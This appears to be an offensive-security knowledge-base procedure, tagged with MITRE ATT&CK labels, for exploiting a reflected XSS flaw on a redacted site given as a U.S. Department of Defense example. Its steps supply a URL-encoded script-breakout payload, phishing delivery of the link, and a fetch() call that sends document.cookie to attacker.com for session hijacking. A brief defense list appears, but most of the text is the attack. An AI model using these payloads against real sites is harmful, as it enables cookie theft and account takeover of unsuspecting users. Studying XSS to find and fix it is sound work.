---
id: proc-reflected-xss-injection
tags:
  - xss
  - reflected-xss
  - javascript-injection
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.513Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Execute-Reflected-XSS-Payload

## Summary

This procedure exploits a reflected cross-site scripting (XSS) vulnerability by injecting a URL-encoded JavaScript payload into a vulnerable URL parameter on a web application, such as a U.S. Department of Defense site, leading to arbitrary code execution in the victim's browser and potential theft of session cookies.

## Description

In a reflected XSS attack, user input from a URL parameter is echoed back into the HTML response without proper sanitization, allowing attackers to inject and execute malicious scripts. This procedure targets endpoints like search or redirect parameters that reflect input directly. The attack requires no authentication and relies on social engineering to lure victims to the malicious URL. Expected outcomes include browser-based code execution, enabling data exfiltration, session hijacking, or further client-side attacks. Prerequisites include knowledge of the vulnerable parameter and a web browser for testing.

## Requirements

1. Access to a web browser for navigation and inspection
2. Knowledge of the target URL and vulnerable parameter (e.g., https://██████████/██████=)
3. Victim interaction via phishing or direct link sharing
4. Optional: Attacker-controlled server for data exfiltration

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding) for all user inputs
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript alerts or network requests from client-side scripts
- Employ Web Application Firewalls (WAFs) to detect common XSS payloads

## Objectives

1. Inject and reflect malicious JavaScript to execute in the browser context
2. Steal sensitive data such as cookies for session hijacking
3. Demonstrate potential for escalated attacks like keylogging or phishing

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Identify the vulnerable URL parameter and encode a JavaScript payload to break out of existing script tags and inject new code. Use URL encoding to bypass basic filters.

Encode the payload '</script><script>alert(document.domain)</script>' as %3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E. Append it to the target URL to form: https://██████████/██████=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E.

> This payload closes any open script tag, injects a new one, and executes an alert to confirm domain access.

### Step 2: Navigate and Execute the Payload

**Context**: Deliver the URL to the victim (e.g., via email) and observe execution upon page load, confirming the reflection and script run.

Open a web browser and navigate to the crafted URL. Inspect the page source to verify the payload is reflected unsanitized.

> Upon successful execution, an alert box pops up showing the document domain, indicating arbitrary JS execution. Extend by replacing alert with document.cookie sent via fetch to an attacker server.

### Step 3: Exfiltrate Data and Verify Impact

**Context**: Once execution is confirmed, modify the payload for data theft and monitor for receipt.

Update the payload to include exfiltration, e.g., %3C/script%3E%3Cscript%3Efetch('http://attacker.com?cookies='+document.cookie)%3C/script%3E, and navigate again. Check the attacker server logs for stolen cookies.

> Successful output includes received cookies on the server, enabling session replay for hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
- [[web-exploitation]]
